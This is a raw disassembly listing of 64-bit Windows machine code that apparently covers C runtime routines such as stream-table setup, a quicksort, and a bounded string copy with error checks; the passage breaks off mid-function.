   140007fef:	48 39 02             	cmp    %rax,(%rdx)
   140007ff2:	74 16                	je     0x14000800a
   140007ff4:	8b 81 a8 03 00 00    	mov    0x3a8(%rcx),%eax
   140007ffa:	85 05 00 d8 00 00    	test   %eax,0xd800(%rip)        # 0x140015800
   140008000:	75 08                	jne    0x14000800a
   140008002:	e8 0d df ff ff       	call   0x140005f14
   140008007:	48 89 03             	mov    %rax,(%rbx)
   14000800a:	48 83 c4 20          	add    $0x20,%rsp
   14000800e:	5b                   	pop    %rbx
   14000800f:	c3                   	ret
   140008010:	48 83 ec 28          	sub    $0x28,%rsp
   140008014:	48 85 c9             	test   %rcx,%rcx
   140008017:	75 15                	jne    0x14000802e
   140008019:	e8 d2 cc ff ff       	call   0x140004cf0
   14000801e:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140008024:	e8 a7 cb ff ff       	call   0x140004bd0
   140008029:	83 c8 ff             	or     $0xffffffff,%eax
   14000802c:	eb 03                	jmp    0x140008031
   14000802e:	8b 41 18             	mov    0x18(%rcx),%eax
   140008031:	48 83 c4 28          	add    $0x28,%rsp
   140008035:	c3                   	ret
   140008036:	90                   	nop
   140008037:	90                   	nop
   140008038:	48 8b c4             	mov    %rsp,%rax
   14000803b:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000803f:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140008043:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140008047:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000804b:	41 56                	push   %r14
   14000804d:	48 83 ec 20          	sub    $0x20,%rsp
   140008051:	8b 05 09 ea 00 00    	mov    0xea09(%rip),%eax        # 0x140016a60
   140008057:	33 db                	xor    %ebx,%ebx
   140008059:	bf 03 00 00 00       	mov    $0x3,%edi
   14000805e:	85 c0                	test   %eax,%eax
   140008060:	75 07                	jne    0x140008069
   140008062:	b8 00 02 00 00       	mov    $0x200,%eax
   140008067:	eb 05                	jmp    0x14000806e
   140008069:	3b c7                	cmp    %edi,%eax
   14000806b:	0f 4c c7             	cmovl  %edi,%eax
   14000806e:	48 63 c8             	movslq %eax,%rcx
   140008071:	ba 08 00 00 00       	mov    $0x8,%edx
   140008076:	89 05 e4 e9 00 00    	mov    %eax,0xe9e4(%rip)        # 0x140016a60
   14000807c:	e8 b7 c7 ff ff       	call   0x140004838
   140008081:	33 c9                	xor    %ecx,%ecx
   140008083:	48 89 05 de e9 00 00 	mov    %rax,0xe9de(%rip)        # 0x140016a68
   14000808a:	e8 b1 c6 ff ff       	call   0x140004740
   14000808f:	48 39 1d d2 e9 00 00 	cmp    %rbx,0xe9d2(%rip)        # 0x140016a68
   140008096:	75 2f                	jne    0x1400080c7
   140008098:	ba 08 00 00 00       	mov    $0x8,%edx
   14000809d:	89 3d bd e9 00 00    	mov    %edi,0xe9bd(%rip)        # 0x140016a60
   1400080a3:	48 8b cf             	mov    %rdi,%rcx
   1400080a6:	e8 8d c7 ff ff       	call   0x140004838
   1400080ab:	33 c9                	xor    %ecx,%ecx
   1400080ad:	48 89 05 b4 e9 00 00 	mov    %rax,0xe9b4(%rip)        # 0x140016a68
   1400080b4:	e8 87 c6 ff ff       	call   0x140004740
   1400080b9:	48 39 1d a8 e9 00 00 	cmp    %rbx,0xe9a8(%rip)        # 0x140016a68
   1400080c0:	75 05                	jne    0x1400080c7
   1400080c2:	83 c8 ff             	or     $0xffffffff,%eax
   1400080c5:	eb 75                	jmp    0x14000813c
   1400080c7:	4c 8b f3             	mov    %rbx,%r14
   1400080ca:	48 8d 35 57 d7 00 00 	lea    0xd757(%rip),%rsi        # 0x140015828
   1400080d1:	48 8d 2d 38 d7 00 00 	lea    0xd738(%rip),%rbp        # 0x140015810
   1400080d8:	48 8d 4d 30          	lea    0x30(%rbp),%rcx
   1400080dc:	45 33 c0             	xor    %r8d,%r8d
   1400080df:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   1400080e4:	e8 13 e7 ff ff       	call   0x1400067fc
   1400080e9:	48 8b 05 78 e9 00 00 	mov    0xe978(%rip),%rax        # 0x140016a68
   1400080f0:	48 8d 15 19 e5 00 00 	lea    0xe519(%rip),%rdx        # 0x140016610
   1400080f7:	48 8b cb             	mov    %rbx,%rcx
   1400080fa:	83 e1 3f             	and    $0x3f,%ecx
   1400080fd:	48 c1 e1 06          	shl    $0x6,%rcx
   140008101:	49 89 2c 06          	mov    %rbp,(%r14,%rax,1)
   140008105:	48 8b c3             	mov    %rbx,%rax
   140008108:	48 c1 f8 06          	sar    $0x6,%rax
   14000810c:	48 8b 04 c2          	mov    (%rdx,%rax,8),%rax
   140008110:	48 8b 4c 08 28       	mov    0x28(%rax,%rcx,1),%rcx
   140008115:	48 83 c1 02          	add    $0x2,%rcx
   140008119:	48 83 f9 02          	cmp    $0x2,%rcx
   14000811d:	77 06                	ja     0x140008125
   14000811f:	c7 06 fe ff ff ff    	movl   $0xfffffffe,(%rsi)
   140008125:	48 ff c3             	inc    %rbx
   140008128:	48 83 c5 58          	add    $0x58,%rbp
   14000812c:	49 83 c6 08          	add    $0x8,%r14
   140008130:	48 83 c6 58          	add    $0x58,%rsi
   140008134:	48 83 ef 01          	sub    $0x1,%rdi
   140008138:	75 9e                	jne    0x1400080d8
   14000813a:	33 c0                	xor    %eax,%eax
   14000813c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008141:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140008146:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000814b:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   140008150:	48 83 c4 20          	add    $0x20,%rsp
   140008154:	41 5e                	pop    %r14
   140008156:	c3                   	ret
   140008157:	90                   	nop
   140008158:	53                   	push   %rbx
   140008159:	48 83 ec 20          	sub    $0x20,%rsp
   14000815d:	e8 ae 0c 00 00       	call   0x140008e10
   140008162:	e8 dd 0d 00 00       	call   0x140008f44
   140008167:	33 db                	xor    %ebx,%ebx
   140008169:	48 8b 0d f8 e8 00 00 	mov    0xe8f8(%rip),%rcx        # 0x140016a68
   140008170:	48 8b 0c 0b          	mov    (%rbx,%rcx,1),%rcx
   140008174:	e8 7f 0e 00 00       	call   0x140008ff8
   140008179:	48 8b 05 e8 e8 00 00 	mov    0xe8e8(%rip),%rax        # 0x140016a68
   140008180:	48 8b 0c 03          	mov    (%rbx,%rax,1),%rcx
   140008184:	48 83 c1 30          	add    $0x30,%rcx
   140008188:	ff 15 c2 3f 00 00    	call   *0x3fc2(%rip)        # 0x14000c150
   14000818e:	48 83 c3 08          	add    $0x8,%rbx
   140008192:	48 83 fb 18          	cmp    $0x18,%rbx
   140008196:	75 d1                	jne    0x140008169
   140008198:	48 8b 0d c9 e8 00 00 	mov    0xe8c9(%rip),%rcx        # 0x140016a68
   14000819f:	e8 9c c5 ff ff       	call   0x140004740
   1400081a4:	48 83 25 bc e8 00 00 	andq   $0x0,0xe8bc(%rip)        # 0x140016a68
   1400081ab:	00 
   1400081ac:	48 83 c4 20          	add    $0x20,%rsp
   1400081b0:	5b                   	pop    %rbx
   1400081b1:	c3                   	ret
   1400081b2:	90                   	nop
   1400081b3:	90                   	nop
   1400081b4:	48 83 c1 30          	add    $0x30,%rcx
   1400081b8:	48 ff 25 81 3f 00 00 	rex.W jmp *0x3f81(%rip)        # 0x14000c140
   1400081bf:	90                   	nop
   1400081c0:	48 83 c1 30          	add    $0x30,%rcx
   1400081c4:	48 ff 25 7d 3f 00 00 	rex.W jmp *0x3f7d(%rip)        # 0x14000c148
   1400081cb:	90                   	nop
   1400081cc:	90                   	nop
   1400081cd:	90                   	nop
   1400081ce:	90                   	nop
   1400081cf:	90                   	nop
   1400081d0:	48 3b d1             	cmp    %rcx,%rdx
   1400081d3:	0f 86 c2 00 00 00    	jbe    0x14000829b
   1400081d9:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   1400081de:	57                   	push   %rdi
   1400081df:	41 56                	push   %r14
   1400081e1:	41 57                	push   %r15
   1400081e3:	48 83 ec 20          	sub    $0x20,%rsp
   1400081e7:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   1400081ec:	4d 8b f1             	mov    %r9,%r14
   1400081ef:	48 89 74 24 48       	mov    %rsi,0x48(%rsp)
   1400081f4:	49 8b e8             	mov    %r8,%rbp
   1400081f7:	4c 89 64 24 50       	mov    %r12,0x50(%rsp)
   1400081fc:	48 8b fa             	mov    %rdx,%rdi
   1400081ff:	4e 8d 24 01          	lea    (%rcx,%r8,1),%r12
   140008203:	4c 8b f9             	mov    %rcx,%r15
   140008206:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000820d:	00 00 00 
   140008210:	49 8b df             	mov    %r15,%rbx
   140008213:	49 8b f4             	mov    %r12,%rsi
   140008216:	4c 3b e7             	cmp    %rdi,%r12
   140008219:	77 25                	ja     0x140008240
   14000821b:	0f 1f 04 00          	nopl   (%rax,%rax,1)
   14000821f:	90                   	nop
   140008220:	49 8b ce             	mov    %r14,%rcx
   140008223:	ff 15 5f 40 00 00    	call   *0x405f(%rip)        # 0x14000c288
   140008229:	48 8b d3             	mov    %rbx,%rdx
   14000822c:	48 8b ce             	mov    %rsi,%rcx
   14000822f:	41 ff d6             	call   *%r14
   140008232:	85 c0                	test   %eax,%eax
   140008234:	48 0f 4f de          	cmovg  %rsi,%rbx
   140008238:	48 03 f5             	add    %rbp,%rsi
   14000823b:	48 3b f7             	cmp    %rdi,%rsi
   14000823e:	76 e0                	jbe    0x140008220
   140008240:	4c 8b c5             	mov    %rbp,%r8
   140008243:	48 8b c7             	mov    %rdi,%rax
   140008246:	48 3b df             	cmp    %rdi,%rbx
   140008249:	74 2b                	je     0x140008276
   14000824b:	48 85 ed             	test   %rbp,%rbp
   14000824e:	74 26                	je     0x140008276
   140008250:	48 2b df             	sub    %rdi,%rbx
   140008253:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   14000825a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140008260:	0f b6 08             	movzbl (%rax),%ecx
   140008263:	0f b6 14 03          	movzbl (%rbx,%rax,1),%edx
   140008267:	88 0c 03             	mov    %cl,(%rbx,%rax,1)
   14000826a:	88 10                	mov    %dl,(%rax)
   14000826c:	48 8d 40 01          	lea    0x1(%rax),%rax
   140008270:	49 83 e8 01          	sub    $0x1,%r8
   140008274:	75 ea                	jne    0x140008260
   140008276:	48 2b fd             	sub    %rbp,%rdi
   140008279:	49 3b ff             	cmp    %r15,%rdi
   14000827c:	77 92                	ja     0x140008210
   14000827e:	4c 8b 64 24 50       	mov    0x50(%rsp),%r12
   140008283:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140008288:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000828d:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140008292:	48 83 c4 20          	add    $0x20,%rsp
   140008296:	41 5f                	pop    %r15
   140008298:	41 5e                	pop    %r14
   14000829a:	5f                   	pop    %rdi
   14000829b:	c3                   	ret
   14000829c:	90                   	nop
   14000829d:	90                   	nop
   14000829e:	90                   	nop
   14000829f:	90                   	nop
   1400082a0:	55                   	push   %rbp
   1400082a1:	41 54                	push   %r12
   1400082a3:	41 56                	push   %r14
   1400082a5:	48 81 ec 40 04 00 00 	sub    $0x440,%rsp
   1400082ac:	48 8b 05 65 cd 00 00 	mov    0xcd65(%rip),%rax        # 0x140015018
   1400082b3:	48 33 c4             	xor    %rsp,%rax
   1400082b6:	48 89 84 24 00 04 00 	mov    %rax,0x400(%rsp)
   1400082bd:	00 
   1400082be:	4d 8b f1             	mov    %r9,%r14
   1400082c1:	49 8b e8             	mov    %r8,%rbp
   1400082c4:	4c 8b e1             	mov    %rcx,%r12
   1400082c7:	48 85 c9             	test   %rcx,%rcx
   1400082ca:	75 1a                	jne    0x1400082e6
   1400082cc:	48 85 d2             	test   %rdx,%rdx
   1400082cf:	74 15                	je     0x1400082e6
   1400082d1:	e8 1a ca ff ff       	call   0x140004cf0
   1400082d6:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   1400082dc:	e8 ef c8 ff ff       	call   0x140004bd0
   1400082e1:	e9 d1 02 00 00       	jmp    0x1400085b7
   1400082e6:	4d 85 c0             	test   %r8,%r8
   1400082e9:	74 e6                	je     0x1400082d1
   1400082eb:	4d 85 c9             	test   %r9,%r9
   1400082ee:	74 e1                	je     0x1400082d1
   1400082f0:	48 83 fa 02          	cmp    $0x2,%rdx
   1400082f4:	0f 82 bd 02 00 00    	jb     0x1400085b7
   1400082fa:	48 89 9c 24 38 04 00 	mov    %rbx,0x438(%rsp)
   140008301:	00 
   140008302:	48 89 b4 24 30 04 00 	mov    %rsi,0x430(%rsp)
   140008309:	00 
   14000830a:	48 89 bc 24 28 04 00 	mov    %rdi,0x428(%rsp)
   140008311:	00 
   140008312:	4c 89 ac 24 20 04 00 	mov    %r13,0x420(%rsp)
   140008319:	00 
   14000831a:	4c 89 bc 24 18 04 00 	mov    %r15,0x418(%rsp)
   140008321:	00 
   140008322:	4c 8d 7a ff          	lea    -0x1(%rdx),%r15
   140008326:	4c 0f af fd          	imul   %rbp,%r15
   14000832a:	4c 03 f9             	add    %rcx,%r15
   14000832d:	45 33 ed             	xor    %r13d,%r13d
   140008330:	33 d2                	xor    %edx,%edx
   140008332:	49 8b c7             	mov    %r15,%rax
   140008335:	49 2b c4             	sub    %r12,%rax
   140008338:	48 f7 f5             	div    %rbp
   14000833b:	48 8d 70 01          	lea    0x1(%rax),%rsi
   14000833f:	48 83 fe 08          	cmp    $0x8,%rsi
   140008343:	77 2a                	ja     0x14000836f
   140008345:	4d 8b ce             	mov    %r14,%r9
   140008348:	4c 8b c5             	mov    %rbp,%r8
   14000834b:	49 8b d7             	mov    %r15,%rdx
   14000834e:	49 8b cc             	mov    %r12,%rcx
   140008351:	e8 7a fe ff ff       	call   0x1400081d0
   140008356:	49 83 ed 01          	sub    $0x1,%r13
   14000835a:	0f 88 2f 02 00 00    	js     0x14000858f
   140008360:	4e 8b 64 ec 20       	mov    0x20(%rsp,%r13,8),%r12
   140008365:	4e 8b bc ec 10 02 00 	mov    0x210(%rsp,%r13,8),%r15
   14000836c:	00 
   14000836d:	eb c1                	jmp    0x140008330
   14000836f:	48 d1 ee             	shr    $1,%rsi
   140008372:	49 8b ce             	mov    %r14,%rcx
   140008375:	48 0f af f5          	imul   %rbp,%rsi
   140008379:	49 03 f4             	add    %r12,%rsi
   14000837c:	ff 15 06 3f 00 00    	call   *0x3f06(%rip)        # 0x14000c288
   140008382:	48 8b d6             	mov    %rsi,%rdx
   140008385:	49 8b cc             	mov    %r12,%rcx
   140008388:	41 ff d6             	call   *%r14
   14000838b:	85 c0                	test   %eax,%eax
   14000838d:	7e 29                	jle    0x1400083b8
   14000838f:	4c 8b c5             	mov    %rbp,%r8
   140008392:	48 8b d6             	mov    %rsi,%rdx
   140008395:	4c 3b e6             	cmp    %rsi,%r12
   140008398:	74 1e                	je     0x1400083b8
   14000839a:	4d 8b cc             	mov    %r12,%r9
   14000839d:	4c 2b ce             	sub    %rsi,%r9
   1400083a0:	0f b6 02             	movzbl (%rdx),%eax
   1400083a3:	41 0f b6 0c 11       	movzbl (%r9,%rdx,1),%ecx
   1400083a8:	41 88 04 11          	mov    %al,(%r9,%rdx,1)
   1400083ac:	88 0a                	mov    %cl,(%rdx)
   1400083ae:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   1400083b2:	49 83 e8 01          	sub    $0x1,%r8
   1400083b6:	75 e8                	jne    0x1400083a0
   1400083b8:	49 8b ce             	mov    %r14,%rcx
   1400083bb:	ff 15 c7 3e 00 00    	call   *0x3ec7(%rip)        # 0x14000c288
   1400083c1:	49 8b d7             	mov    %r15,%rdx
   1400083c4:	49 8b cc             	mov    %r12,%rcx
   1400083c7:	41 ff d6             	call   *%r14
   1400083ca:	85 c0                	test   %eax,%eax
   1400083cc:	7e 29                	jle    0x1400083f7
   1400083ce:	4c 8b c5             	mov    %rbp,%r8
   1400083d1:	49 8b d7             	mov    %r15,%rdx
   1400083d4:	4d 3b e7             	cmp    %r15,%r12
   1400083d7:	74 1e                	je     0x1400083f7
   1400083d9:	4d 8b cc             	mov    %r12,%r9
   1400083dc:	4d 2b cf             	sub    %r15,%r9
   1400083df:	0f b6 02             	movzbl (%rdx),%eax
   1400083e2:	41 0f b6 0c 11       	movzbl (%r9,%rdx,1),%ecx
   1400083e7:	41 88 04 11          	mov    %al,(%r9,%rdx,1)
   1400083eb:	88 0a                	mov    %cl,(%rdx)
   1400083ed:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   1400083f1:	49 83 e8 01          	sub    $0x1,%r8
   1400083f5:	75 e8                	jne    0x1400083df
   1400083f7:	49 8b ce             	mov    %r14,%rcx
   1400083fa:	ff 15 88 3e 00 00    	call   *0x3e88(%rip)        # 0x14000c288
   140008400:	49 8b d7             	mov    %r15,%rdx
   140008403:	48 8b ce             	mov    %rsi,%rcx
   140008406:	41 ff d6             	call   *%r14
   140008409:	85 c0                	test   %eax,%eax
   14000840b:	7e 2b                	jle    0x140008438
   14000840d:	4c 8b c5             	mov    %rbp,%r8
   140008410:	49 8b d7             	mov    %r15,%rdx
   140008413:	49 3b f7             	cmp    %r15,%rsi
   140008416:	74 20                	je     0x140008438
   140008418:	4c 8b ce             	mov    %rsi,%r9
   14000841b:	4d 2b cf             	sub    %r15,%r9
   14000841e:	66 90                	xchg   %ax,%ax
   140008420:	0f b6 02             	movzbl (%rdx),%eax
   140008423:	41 0f b6 0c 11       	movzbl (%r9,%rdx,1),%ecx
   140008428:	41 88 04 11          	mov    %al,(%r9,%rdx,1)
   14000842c:	88 0a                	mov    %cl,(%rdx)
   14000842e:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   140008432:	49 83 e8 01          	sub    $0x1,%r8
   140008436:	75 e8                	jne    0x140008420
   140008438:	49 8b dc             	mov    %r12,%rbx
   14000843b:	49 8b ff             	mov    %r15,%rdi
   14000843e:	66 90                	xchg   %ax,%ax
   140008440:	48 3b f3             	cmp    %rbx,%rsi
   140008443:	76 23                	jbe    0x140008468
   140008445:	48 03 dd             	add    %rbp,%rbx
   140008448:	48 3b de             	cmp    %rsi,%rbx
   14000844b:	73 1b                	jae    0x140008468
   14000844d:	49 8b ce             	mov    %r14,%rcx
   140008450:	ff 15 32 3e 00 00    	call   *0x3e32(%rip)        # 0x14000c288
   140008456:	48 8b d6             	mov    %rsi,%rdx
   140008459:	48 8b cb             	mov    %rbx,%rcx
   14000845c:	41 ff d6             	call   *%r14
   14000845f:	85 c0                	test   %eax,%eax
   140008461:	7e e2                	jle    0x140008445
   140008463:	48 3b f3             	cmp    %rbx,%rsi
   140008466:	77 1e                	ja     0x140008486
   140008468:	48 03 dd             	add    %rbp,%rbx
   14000846b:	49 3b df             	cmp    %r15,%rbx
   14000846e:	77 16                	ja     0x140008486
   140008470:	49 8b ce             	mov    %r14,%rcx
   140008473:	ff 15 0f 3e 00 00    	call   *0x3e0f(%rip)        # 0x14000c288
   140008479:	48 8b d6             	mov    %rsi,%rdx
   14000847c:	48 8b cb             	mov    %rbx,%rcx
   14000847f:	41 ff d6             	call   *%r14
   140008482:	85 c0                	test   %eax,%eax
   140008484:	7e e2                	jle    0x140008468
   140008486:	48 2b fd             	sub    %rbp,%rdi
   140008489:	48 3b fe             	cmp    %rsi,%rdi
   14000848c:	76 16                	jbe    0x1400084a4
   14000848e:	49 8b ce             	mov    %r14,%rcx
   140008491:	ff 15 f1 3d 00 00    	call   *0x3df1(%rip)        # 0x14000c288
   140008497:	48 8b d6             	mov    %rsi,%rdx
   14000849a:	48 8b cf             	mov    %rdi,%rcx
   14000849d:	41 ff d6             	call   *%r14
   1400084a0:	85 c0                	test   %eax,%eax
   1400084a2:	7f e2                	jg     0x140008486
   1400084a4:	48 3b fb             	cmp    %rbx,%rdi
   1400084a7:	72 40                	jb     0x1400084e9
   1400084a9:	4c 8b c5             	mov    %rbp,%r8
   1400084ac:	48 8b d7             	mov    %rdi,%rdx
   1400084af:	48 3b df             	cmp    %rdi,%rbx
   1400084b2:	74 24                	je     0x1400084d8
   1400084b4:	4c 8b cb             	mov    %rbx,%r9
   1400084b7:	4c 2b cf             	sub    %rdi,%r9
   1400084ba:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400084c0:	0f b6 02             	movzbl (%rdx),%eax
   1400084c3:	41 0f b6 0c 11       	movzbl (%r9,%rdx,1),%ecx
   1400084c8:	41 88 04 11          	mov    %al,(%r9,%rdx,1)
   1400084cc:	88 0a                	mov    %cl,(%rdx)
   1400084ce:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   1400084d2:	49 83 e8 01          	sub    $0x1,%r8
   1400084d6:	75 e8                	jne    0x1400084c0
   1400084d8:	48 3b f7             	cmp    %rdi,%rsi
   1400084db:	0f 85 5f ff ff ff    	jne    0x140008440
   1400084e1:	48 8b f3             	mov    %rbx,%rsi
   1400084e4:	e9 57 ff ff ff       	jmp    0x140008440
   1400084e9:	48 03 fd             	add    %rbp,%rdi
   1400084ec:	48 3b f7             	cmp    %rdi,%rsi
   1400084ef:	73 23                	jae    0x140008514
   1400084f1:	48 2b fd             	sub    %rbp,%rdi
   1400084f4:	48 3b fe             	cmp    %rsi,%rdi
   1400084f7:	76 1b                	jbe    0x140008514
   1400084f9:	49 8b ce             	mov    %r14,%rcx
   1400084fc:	ff 15 86 3d 00 00    	call   *0x3d86(%rip)        # 0x14000c288
   140008502:	48 8b d6             	mov    %rsi,%rdx
   140008505:	48 8b cf             	mov    %rdi,%rcx
   140008508:	41 ff d6             	call   *%r14
   14000850b:	85 c0                	test   %eax,%eax
   14000850d:	74 e2                	je     0x1400084f1
   14000850f:	48 3b f7             	cmp    %rdi,%rsi
   140008512:	72 1e                	jb     0x140008532
   140008514:	48 2b fd             	sub    %rbp,%rdi
   140008517:	49 3b fc             	cmp    %r12,%rdi
   14000851a:	76 16                	jbe    0x140008532
   14000851c:	49 8b ce             	mov    %r14,%rcx
   14000851f:	ff 15 63 3d 00 00    	call   *0x3d63(%rip)        # 0x14000c288
   140008525:	48 8b d6             	mov    %rsi,%rdx
   140008528:	48 8b cf             	mov    %rdi,%rcx
   14000852b:	41 ff d6             	call   *%r14
   14000852e:	85 c0                	test   %eax,%eax
   140008530:	74 e2                	je     0x140008514
   140008532:	49 8b cf             	mov    %r15,%rcx
   140008535:	48 8b c7             	mov    %rdi,%rax
   140008538:	48 2b cb             	sub    %rbx,%rcx
   14000853b:	49 2b c4             	sub    %r12,%rax
   14000853e:	48 3b c1             	cmp    %rcx,%rax
   140008541:	7c 26                	jl     0x140008569
   140008543:	4c 3b e7             	cmp    %rdi,%r12
   140008546:	73 10                	jae    0x140008558
   140008548:	4e 89 64 ec 20       	mov    %r12,0x20(%rsp,%r13,8)
   14000854d:	4a 89 bc ec 10 02 00 	mov    %rdi,0x210(%rsp,%r13,8)
   140008554:	00 
   140008555:	49 ff c5             	inc    %r13
   140008558:	49 3b df             	cmp    %r15,%rbx
   14000855b:	0f 83 f5 fd ff ff    	jae    0x140008356
   140008561:	4c 8b e3             	mov    %rbx,%r12
   140008564:	e9 c7 fd ff ff       	jmp    0x140008330
   140008569:	49 3b df             	cmp    %r15,%rbx
   14000856c:	73 10                	jae    0x14000857e
   14000856e:	4a 89 5c ec 20       	mov    %rbx,0x20(%rsp,%r13,8)
   140008573:	4e 89 bc ec 10 02 00 	mov    %r15,0x210(%rsp,%r13,8)
   14000857a:	00 
   14000857b:	49 ff c5             	inc    %r13
   14000857e:	4c 3b e7             	cmp    %rdi,%r12
   140008581:	0f 83 cf fd ff ff    	jae    0x140008356
   140008587:	4c 8b ff             	mov    %rdi,%r15
   14000858a:	e9 a1 fd ff ff       	jmp    0x140008330
   14000858f:	4c 8b ac 24 20 04 00 	mov    0x420(%rsp),%r13
   140008596:	00 
   140008597:	48 8b bc 24 28 04 00 	mov    0x428(%rsp),%rdi
   14000859e:	00 
   14000859f:	48 8b b4 24 30 04 00 	mov    0x430(%rsp),%rsi
   1400085a6:	00 
   1400085a7:	48 8b 9c 24 38 04 00 	mov    0x438(%rsp),%rbx
   1400085ae:	00 
   1400085af:	4c 8b bc 24 18 04 00 	mov    0x418(%rsp),%r15
   1400085b6:	00 
   1400085b7:	48 8b 8c 24 00 04 00 	mov    0x400(%rsp),%rcx
   1400085be:	00 
   1400085bf:	48 33 cc             	xor    %rsp,%rcx
   1400085c2:	e8 d9 94 ff ff       	call   0x140001aa0
   1400085c7:	48 81 c4 40 04 00 00 	add    $0x440,%rsp
   1400085ce:	41 5e                	pop    %r14
   1400085d0:	41 5c                	pop    %r12
   1400085d2:	5d                   	pop    %rbp
   1400085d3:	c3                   	ret
   1400085d4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400085d9:	57                   	push   %rdi
   1400085da:	48 83 ec 20          	sub    $0x20,%rsp
   1400085de:	45 33 d2             	xor    %r10d,%r10d
   1400085e1:	4c 8b da             	mov    %rdx,%r11
   1400085e4:	4d 85 c9             	test   %r9,%r9
   1400085e7:	75 2c                	jne    0x140008615
   1400085e9:	48 85 c9             	test   %rcx,%rcx
   1400085ec:	75 2c                	jne    0x14000861a
   1400085ee:	48 85 d2             	test   %rdx,%rdx
   1400085f1:	74 14                	je     0x140008607
   1400085f3:	e8 f8 c6 ff ff       	call   0x140004cf0
   1400085f8:	bb 16 00 00 00       	mov    $0x16,%ebx
   1400085fd:	89 18                	mov    %ebx,(%rax)
   1400085ff:	e8 cc c5 ff ff       	call   0x140004bd0
   140008604:	44 8b d3             	mov    %ebx,%r10d
   140008607:	41 8b c2             	mov    %r10d,%eax
   14000860a:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000860f:	48 83 c4 20          	add    $0x20,%rsp
   140008613:	5f                   	pop    %rdi
   140008614:	c3                   	ret
   140008615:	48 85 c9             	test   %rcx,%rcx
   140008618:	74 d9                	je     0x1400085f3
   14000861a:	48 85 d2             	test   %rdx,%rdx
   14000861d:	74 d4                	je     0x1400085f3
   14000861f:	4d 85 c9             	test   %r9,%r9
   140008622:	75 05                	jne    0x140008629
   140008624:	44 88 11             	mov    %r10b,(%rcx)
   140008627:	eb de                	jmp    0x140008607
   140008629:	4d 85 c0             	test   %r8,%r8
   14000862c:	75 05                	jne    0x140008633
   14000862e:	44 88 11             	mov    %r10b,(%rcx)
   140008631:	eb c0                	jmp    0x1400085f3
   140008633:	4c 2b c1             	sub    %rcx,%r8
   140008636:	48 8b d1             	mov    %rcx,%rdx
   140008639:	49 8b db             	mov    %r11,%rbx
   14000863c:	49 8b f9             	mov    %r9,%rdi
   14000863f:	49 83 f9 ff          	cmp    $0xffffffffffffffff,%r9
   140008643:	75 15                	jne    0x14000865a
   140008645:	41 8a 04 10          	mov    (%r8,%rdx,1),%al
   140008649:	88 02                	mov    %al,(%rdx)
   14000864b:	48 ff c2             	inc    %rdx
   14000864e:	84 c0                	test   %al,%al
   140008650:	74 29                	je     0x14000867b
   140008652:	48 83 eb 01          	sub    $0x1,%rbx
   140008656:	75 ed                	jne    0x140008645
   140008658:	eb 21                	jmp    0x14000867b
   14000865a:	41 8a 04 10          	mov    (%r8,%rdx,1),%al
   14000865e:	88 02                	mov    %al,(%rdx)
   140008660:	48 ff c2             	inc    %rdx
   140008663:	84 c0                	test   %al,%al
   140008665:	74 0c                	je     0x140008673
   140008667:	48 83 eb 01          	sub    $0x1,%rbx
   14000866b:	74 06                	je     0x140008673
   14000866d:	48 83 ef 01          	sub    $0x1,%rdi
   140008671:	75 e7                	jne    0x14000865a
   140008673:	48 85 ff             	test   %rdi,%rdi
   140008676:	75 03                	jne    0x14000867b
   140008678:	44 88 12             	mov    %r10b,(%rdx)
   14000867b:	48 85 db             	test   %rbx,%rbx
   14000867e:	75 87                	jne    0x140008607
   140008680:	49 83 f9 ff          	cmp    $0xffffffffffffffff,%r9
   140008684:	75 0e                	jne    0x140008694
   140008686:	46 88 54 19 ff       	mov    %r10b,-0x1(%rcx,%r11,1)
   14000868b:	44 8d 53 50          	lea    0x50(%rbx),%r10d
   14000868f:	e9 73 ff ff ff       	jmp    0x140008607
   140008694:	44 88 11             	mov    %r10b,(%rcx)
   140008697:	e8 54 c6 ff ff       	call   0x140004cf0
   14000869c:	bb 22 00 00 00       	mov    $0x22,%ebx
   1400086a1:	e9 57 ff ff ff       	jmp    0x1400085fd
   1400086a6:	90                   	nop
   1400086a7:	90                   	nop
   1400086a8:	48 83 ec 58          	sub    $0x58,%rsp
   1400086ac:	48 8b 05 65 c9 00 00 	mov    0xc965(%rip),%rax        # 0x140015018
   1400086b3:	48 33 c4             	xor    %rsp,%rax
   1400086b6:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400086bb:	33 c0                	xor    %eax,%eax
   1400086bd:	4c 8b ca             	mov    %rdx,%r9
   1400086c0:	48 83 f8 20          	cmp    $0x20,%rax
   1400086c4:	4c 8b c1             	mov    %rcx,%r8
   1400086c7:	73 77                	jae    0x140008740
   1400086c9:	c6 44 04 20 00       	movb   $0x0,0x20(%rsp,%rax,1)
   1400086ce:	48 ff c0             	inc    %rax
   1400086d1:	48 83 f8 20          	cmp    $0x20,%rax
   1400086d5:	7c f0                	jl     0x1400086c7
   1400086d7:	8a 02                	mov    (%rdx),%al
   1400086d9:	eb 1f                	jmp    0x1400086fa
   1400086db:	0f b6 d0             	movzbl %al,%edx
   1400086de:	48 c1 ea 03          	shr    $0x3,%rdx
   1400086e2:	0f b6 c0             	movzbl %al,%eax
   1400086e5:	83 e0 07             	and    $0x7,%eax
